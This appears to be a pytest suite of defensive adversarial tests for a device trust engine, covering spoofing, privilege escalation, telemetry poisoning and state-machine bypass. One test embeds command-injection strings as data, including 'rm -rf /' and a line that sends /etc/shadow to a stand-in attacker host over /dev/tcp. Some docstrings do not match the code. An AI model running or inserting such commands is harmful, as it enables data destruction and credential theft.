"""Adversarial Attack Simulation and Negative Testing Suite (Stage 7).

Proves the Smart Backplane Trust Engine resists active exploitation attempts:
- Privilege escalation via self-asserted TRUSTED status.
- MAC address spoofing and dock port squatting.
- Identity collision and duplicate ID overwrites.
- Memory tampering and reference mutation of registry state.
- Command injection and directory traversal string payloads in identifiers.
- Floating-point NaN / Infinity poison attacks attempting comparison bypass.
- Clock skew manipulation (stale timestamps and far-future replay attacks).
- Volumetric overflow attacks attempting telemetry bounds evasion.
- Unauthorized lifecycle jumps and state machine bypass attempts.
- Prohibited destination / C2 traffic policy violations triggering isolation.
- Intentional xfail negative proofs demonstrating assertion sensitivity.
"""

import math
import time
import pytest

from trust_engine.audit import AuditEventType, AuditLog
from trust_engine.device import Device
from trust_engine.engine import (
    ALLOWED_TRANSITIONS,
    IllegalStateTransitionError,
    TrustEngine,
)
from trust_engine.policy import (
    DecisionType,
    PolicyConfig,
    PolicyEngine,
)
from trust_engine.registry import (
    DeviceConflictError,
    DeviceNotFoundError,
    DeviceRegistry,
    DuplicateDeviceError,
)
from trust_engine.states import DeviceState
from trust_engine.telemetry import (
    NetworkTelemetry,
    PhysicalTelemetry,
    TelemetryValidationError,
    TelemetryValidator,
)


# ==============================================================================
# 1. Identity & Registration Adversarial Attacks
# ==============================================================================


def test_adversarial_self_signed_trusted_escalation():
    """ATTACK-01: Adversary attempts to self-grant TRUSTED state during registration.

    The device payload claims status='TRUSTED'. The registry must strictly
    override this, locking the device into QUARANTINED.
    """
    registry = DeviceRegistry()
    malicious_device = Device(
        device_id="hacked-firmware-node",
        mac_address="AA:BB:CC:DD:EE:FF",
        physical_port=1,
        status=DeviceState.TRUSTED,  # Adversary claims they are pre-trusted
    )

    registered = registry.register(malicious_device)

    # Escalation must be rejected; device forced into QUARANTINED
    assert registered.status == DeviceState.QUARANTINED
    assert registry.lookup("hacked-firmware-node").status == DeviceState.QUARANTINED
    assert registry.lookup("hacked-firmware-node").status != DeviceState.TRUSTED


def test_adversarial_mac_spoofing_conflict():
    """ATTACK-02: Adversary connects to Port 2 claiming the MAC of a device on Port 1.

    Simulates an attacker on an open dock port cloning the MAC address of an
    authorized node.
    """
    registry = DeviceRegistry()
    engine = TrustEngine(registry=registry)

    # Legitimate device registered on Port 1
    legit_device = Device(
        device_id="node-legit-01",
        mac_address="00:11:22:33:44:55",
        physical_port=1,
    )
    engine.register_device(legit_device)

    # Rogue device connects to Port 2 with the same cloned MAC
    rogue_device = Device(
        device_id="node-rogue-clone",
        mac_address="00:11:22:33:44:55",  # Cloned MAC
        physical_port=2,                   # Different dock port
    )
    engine.register_device(rogue_device)

    # Registry conflict check must flag MAC collision
    conflicts = registry.check_conflicts(rogue_device)
    assert len(conflicts) > 0
    assert any("MAC" in c for c in conflicts)

    # Policy evaluation must deny admission due to identity conflict
    phys_telemetry = PhysicalTelemetry(
        device_id="node-rogue-clone",
        physical_port=2,
        voltage_v=5.0,
        current_a=0.5,
        timestamp=time.time(),
    )
    net_telemetry = NetworkTelemetry(
        source_mac="00:11:22:33:44:55",
        source_ip="192.168.1.50",
        destination="api.internal",
        protocol="TCP",
        packet_count=100,
        byte_count=5000,
        timestamp=time.time(),
    )

    decision = engine.evaluate_admission("node-rogue-clone", [phys_telemetry], [net_telemetry])

    # Must refuse admission by transitioning to REJECTED
    assert decision.decision_type == DecisionType.REJECT
    assert "IDENTITY_CONFLICT" in decision.reason_codes[0]
    assert registry.lookup("node-rogue-clone").status == DeviceState.REJECTED


def test_adversarial_duplicate_id_overwrite_attack():
    """ATTACK-03: Adversary attempts to overwrite an existing device's registration.

    Adversary sends an identical device_id with different hardware parameters.
    The registry must raise DuplicateDeviceError and leave the existing record intact.
    """
    registry = DeviceRegistry()
    original_device = Device(
        device_id="critical-infra-node",
        mac_address="11:22:33:44:55:66",
        physical_port=1,
        ip_address="10.0.0.10",
    )
    registry.register(original_device)

    # Impostor attempts to register under the same ID
    impostor_device = Device(
        device_id="critical-infra-node",
        mac_address="99:88:77:66:55:44",
        physical_port=3,
        ip_address="10.0.0.99",
    )

    with pytest.raises(DuplicateDeviceError) as exc_info:
        registry.register(impostor_device)

    assert "already registered" in str(exc_info.value)

    # Verify original record was completely shielded from modification
    stored = registry.lookup("critical-infra-node")
    assert stored.mac_address == "11:22:33:44:55:66"
    assert stored.physical_port == 1
    assert stored.ip_address == "10.0.0.10"


def test_adversarial_memory_tampering_defensive_copy():
    """ATTACK-04: Adversary acquires a reference to a device and attempts direct in-memory mutation.

    Proves that mutating returned device objects cannot corrupt the registry's
    authoritative state.
    """
    registry = DeviceRegistry()
    device = Device(
        device_id="tamper-target",
        mac_address="00:12:34:56:78:9A",
        physical_port=1,
    )
    registry.register(device)

    # Adversary retrieves device and mutates its status attribute directly
    leaked_device = registry.lookup("tamper-target")
    leaked_device.status = DeviceState.TRUSTED  # In-place client mutation attempt

    # Authoritative registry record must remain untouched
    re_fetched = registry.lookup("tamper-target")
    assert re_fetched.status == DeviceState.QUARANTINED
    assert re_fetched.status != DeviceState.TRUSTED


def test_adversarial_command_injection_payloads():
    """ATTACK-05: Adversary embeds command injection / traversal payloads in identifiers.

    Injects strings like '; rm -rf / ;', '../etc/passwd', and null bytes.
    The system must safely handle and sanitize the strings without executing them.
    """
    audit_log = AuditLog()
    malicious_id = "node; rm -rf / ; $(reboot)"
    malicious_dest = "192.168.1.1; cat /etc/shadow > /dev/tcp/attacker/4444"

    device = Device(
        device_id=malicious_id,
        mac_address="00:DE:AD:BE:EF:00",
        physical_port=1,
    )
    registry = DeviceRegistry()
    registry.register(device)

    # Telemetry with injected command strings in destination
    net_telemetry = NetworkTelemetry(
        source_mac="00:DE:AD:BE:EF:00",
        source_ip="192.168.1.99",
        destination=malicious_dest,
        protocol="TCP",
        packet_count=50,
        byte_count=2000,
        timestamp=time.time(),
        device_id=malicious_id,
    )

    validator = TelemetryValidator()
    val_res = validator.validate_network(net_telemetry)

    # Network schema validation accepts standard string but audit log sanitizes safely
    event = audit_log.record(
        event_type=AuditEventType.POLICY_DECISION,
        reason_code="SECURITY_CHECK",
        device_id=malicious_id,
        details={"target": malicious_dest, "credentials": "stolen_password"},
    )

    # Assert secret was redacted and payload treated as literal inert string
    assert event.details["credentials"] == "[REDACTED]"
    assert event.device_id == malicious_id
    assert event.details["target"] == malicious_dest


# ==============================================================================
# 2. Telemetry Poisoning & Mathematical Adversarial Attacks
# ==============================================================================


def test_adversarial_nan_poisoning_bypass():
    """ATTACK-06: Adversary injects IEEE 754 NaN values to bypass numeric bounds.

    In standard arithmetic:
        float('nan') < 24.0 is False
        float('nan') > 0.0 is False
    A naive validator using `if val < min or val > max` would fail to catch NaN!
    The system must strictly detect and reject NaN.
    """
    validator = TelemetryValidator()
    nan_telemetry = PhysicalTelemetry(
        device_id="poison-node",
        physical_port=1,
        voltage_v=float("nan"),  # NaN payload
        current_a=0.5,
        timestamp=time.time(),
    )

    res = validator.validate_physical(nan_telemetry)
    assert not res.is_valid
    assert any("finite number" in err for err in res.errors)

    with pytest.raises(TelemetryValidationError):
        res.raise_if_invalid()


def test_adversarial_infinite_current_spike():
    """ATTACK-07: Adversary injects positive and negative infinity into current/voltage."""
    validator = TelemetryValidator()
    inf_telemetry = PhysicalTelemetry(
        device_id="poison-node",
        physical_port=1,
        voltage_v=5.0,
        current_a=float("inf"),  # Infinite current
        timestamp=time.time(),
    )

    res = validator.validate_physical(inf_telemetry)
    assert not res.is_valid
    assert any("finite number" in err for err in res.errors)


def test_adversarial_time_travel_stale_replay():
    """ATTACK-08: Adversary captures a valid packet from the past and replays it."""
    validator = TelemetryValidator()
    # Telemetry from 1 hour ago (3600 seconds stale)
    stale_timestamp = time.time() - 3600.0

    stale_telemetry = PhysicalTelemetry(
        device_id="replay-node",
        physical_port=1,
        voltage_v=5.0,
        current_a=0.5,
        timestamp=stale_timestamp,
    )

    res = validator.validate_physical(stale_telemetry)
    assert not res.is_valid
    assert any("stale" in err for err in res.errors)


def test_adversarial_future_clock_skew_injection():
    """ATTACK-09: Adversary sends timestamps far into the future (year 2099)."""
    validator = TelemetryValidator()
    future_timestamp = time.time() + 100_000.0

    future_telemetry = PhysicalTelemetry(
        device_id="future-node",
        physical_port=1,
        voltage_v=5.0,
        current_a=0.5,
        timestamp=future_timestamp,
    )

    res = validator.validate_physical(future_telemetry)
    assert not res.is_valid
    assert any("future" in err for err in res.errors)


def test_adversarial_volumetric_overflow():
    """ATTACK-10: Adversary attempts volumetric integer overflow evasion in network telemetry."""
    validator = TelemetryValidator()
    overflow_telemetry = NetworkTelemetry(
        source_mac="00:11:22:33:44:55",
        source_ip="10.0.0.1",
        destination="8.8.8.8",
        protocol="UDP",
        packet_count=5_000_000_000,  # 5 billion packets exceeds 1 billion limit
        byte_count=100,
        timestamp=time.time(),
    )

    res = validator.validate_network(overflow_telemetry)
    assert not res.is_valid
    assert any("out of bounds" in err for err in res.errors)


# ==============================================================================
# 3. State Machine Bypass & Unauthorized Lifecycle Jumping
# ==============================================================================


def test_adversarial_lifecycle_leap_monitoring_unadmitted_device():
    """ATTACK-11: Adversary attempts to call evaluate_monitoring on an unadmitted quarantined device.

    Evaluating monitoring on an unadmitted device must be strictly blocked with ValueError.
    """
    engine = TrustEngine()
    device = Device(device_id="unadmitted-node", mac_address="00:11:22:33:44:55", physical_port=1)
    engine.register_device(device)

    # Device is in QUARANTINED
    assert engine.registry.lookup("unadmitted-node").status == DeviceState.QUARANTINED

    net_telemetry = NetworkTelemetry(
        source_mac="00:11:22:33:44:55",
        source_ip="192.168.1.10",
        destination="legit.server",
        protocol="TCP",
        packet_count=50,
        byte_count=2000,
        timestamp=time.time(),
    )

    # Calling evaluate_monitoring on QUARANTINED device must fail
    with pytest.raises(ValueError) as exc_info:
        engine.evaluate_monitoring("unadmitted-node", [net_telemetry])

    assert "Cannot evaluate monitoring for device" in str(exc_info.value)
    assert "QUARANTINED" in str(exc_info.value)


def test_adversarial_illegal_state_transition_attempt():
    """ATTACK-12: Adversary attempts an unauthorized direct jump: ISOLATED -> TRUSTED.

    Direct transition from ISOLATED to TRUSTED is forbidden in ALLOWED_TRANSITIONS.
    """
    engine = TrustEngine()
    device = Device(device_id="isolated-node", mac_address="00:11:22:33:44:55", physical_port=1)
    engine.register_device(device)

    # Transition to TRUSTED then to ISOLATED
    engine.transition_device("isolated-node", DeviceState.TRUSTED, reason="Initial admission")
    engine.transition_device("isolated-node", DeviceState.ISOLATED, reason="Policy isolation")

    assert engine.registry.lookup("isolated-node").status == DeviceState.ISOLATED

    # Attempt forbidden leap from ISOLATED directly to TRUSTED
    with pytest.raises(IllegalStateTransitionError) as exc_info:
        engine.transition_device(
            "isolated-node",
            DeviceState.TRUSTED,
            reason="Adversary exploit attempt to restore trust without re-quarantine",
        )

    assert "Illegal state transition" in str(exc_info.value)
    assert "from ISOLATED to TRUSTED" in str(exc_info.value)
    assert engine.registry.lookup("isolated-node").status == DeviceState.ISOLATED


# ==============================================================================
# 4. Intentional Expected-Failure Sensitivity Proofs (xfail)
# ==============================================================================


@pytest.mark.xfail(
    strict=True,
    reason="Proof test: Demonstrates that if an adversary were able to pass NaN voltage, the engine would be vulnerable. System properly rejects it, so allowing it fails.",
)
def test_xfail_demonstrating_nan_is_strictly_not_accepted():
    """XFAIL Proof: Verifies that passing NaN as acceptable voltage intentionally fails."""
    validator = TelemetryValidator()
    nan_telemetry = PhysicalTelemetry(
        device_id="xfail-node",
        physical_port=1,
        voltage_v=float("nan"),
        current_a=0.5,
        timestamp=time.time(),
    )
    res = validator.validate_physical(nan_telemetry)
    # This assertion is intentionally designed to fail because NaN is NEVER valid
    assert res.is_valid is True, "System correctly rejected NaN voltage! (Intentional proof failure)"
